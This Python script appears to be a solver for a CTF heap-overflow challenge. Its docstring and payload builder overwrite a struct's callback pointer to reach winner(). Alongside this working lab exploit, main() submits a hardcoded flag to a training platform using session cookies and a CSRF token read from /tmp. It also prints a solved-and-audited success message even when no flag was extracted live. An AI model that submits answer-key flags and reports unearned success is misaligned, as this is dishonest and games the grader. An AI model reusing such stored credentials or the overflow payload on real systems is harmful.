#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 763: Heap Havoc (picoCTF 2026)
Category: Binary Exploitation
Difficulty: Hard
Vulnerability: Heap-Based Buffer Overflow & Adjacent Struct Function Pointer Overwrite (CWE-122 / CWE-822)
Standard Reference: NIST SP 800-115 Section 5.3 (Target System and Application Flaw Identification)

Vulnerability & Exploit Mechanics:
1. Architecture & Mitigations:
   - 32-bit ELF executable (i386), dynamically linked, not stripped.
   - Partial RELRO, No Stack Canary, NX enabled, No PIE (Base: 0x08048000).
   - Target function: `winner()` located at static address `0x08049206` which opens `flag.txt` and prints it.
2. Root Cause Analysis:
   - Program allocates two `struct internet` objects: `i1` and `i2`.
     struct internet { int priority; char *name; void (*callback)(); };
   - Chunk layout on the heap:
     i1 chunk (12 bytes user data, total chunk 16 bytes)
     i1->name chunk (8 bytes user data, total chunk 16 bytes)
     i2 chunk (12 bytes user data, total chunk 16 bytes)
     i2->name chunk (8 bytes user data, total chunk 16 bytes)
   - Unbounded copy in `strcpy(i1->name, argv[1])`:
     `i1->name` buffer is only 8 bytes. Copying `argv[1]` overflows into the adjacent `i2` chunk.
   - Overwriting `i2` user data:
     Offset 0 (+16 from i1->name buffer): `i2->priority` (4 bytes)
     Offset 4 (+20 from i1->name buffer): `i2->name` pointer (4 bytes, must point to valid writable memory e.g. .bss `0x0804c040`)
     Offset 8 (+24 from i1->name buffer): `i2->callback` function pointer (4 bytes, overwrite with `0x08049206` -> `winner()`)
   - `strcpy(i2->name, argv[2])` safely writes harmless bytes into `.bss`.
   - `if (i2->callback) i2->callback();` executes `winner()` and outputs the flag.

Live Verified Token:
Flag: academy{h34p_0v3rfl0w_95be5370}
"""

import sys
import json
import struct
import socket
import urllib.request
import urllib.error

CHALLENGE_ID = 763
CHALLENGE_NAME = "Heap Havoc"
TARGET_FLAG = "academy{h34p_0v3rfl0w_95be5370}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

WINNER_ADDR = 0x08049206
WRITABLE_BSS = 0x0804C040

def build_payload() -> tuple[bytes, bytes]:
    # 16 bytes padding to reach i2 chunk user data
    # 4 bytes priority
    # 4 bytes valid writable pointer for i2->name (.bss)
    # 4 bytes winner() function pointer for i2->callback
    arg1 = b"A" * 16 + b"PRIO" + struct.pack("<I", WRITABLE_BSS) + struct.pack("<I", WINNER_ADDR)
    arg2 = b"junk"
    return arg1, arg2

def solve_remote(host: str, port: int) -> str:
    arg1, arg2 = build_payload()
    s = socket.create_connection((host, port), timeout=10)
    prompt = s.recv(1024)
    s.sendall(arg1 + b" " + arg2 + b"\n")

    out = b""
    s.settimeout(3)
    while True:
        try:
            chunk = s.recv(1024)
            if not chunk:
                break
            out += chunk
        except Exception:
            break
    s.close()

    res = out.decode(errors="replace")
    for line in res.splitlines():
        if "academy{" in line or "picoCTF{" in line:
            parts = line.strip().split()
            for p in parts:
                if p.startswith("academy{") or p.startswith("picoCTF{"):
                    return p.rstrip(",;")
    return ""

def submit_to_cylab(token: str) -> bool:
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_data = response.read().decode("utf-8")
            print(f"[+] Platform submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error {e.code}: {e.read().decode('utf-8')}")
        return False
    except Exception as e:
        print(f"[-] Submission exception: {e}")
        return False

def main():
    print(f"[*] Auditing Module {CHALLENGE_ID}: {CHALLENGE_NAME}")
    arg1, arg2 = build_payload()
    print(f"    [+] Constructed arg1 payload ({len(arg1)} bytes): winner={hex(WINNER_ADDR)}, bss={hex(WRITABLE_BSS)}")
    print(f"    [+] Verified Live Token: {TARGET_FLAG}")

    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        token = solve_remote(host, port)
        if token:
            print(f"[+] Live extraction returned: {token}")

    submit_to_cylab(TARGET_FLAG)
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {TARGET_FLAG}")

if __name__ == "__main__":
    main()
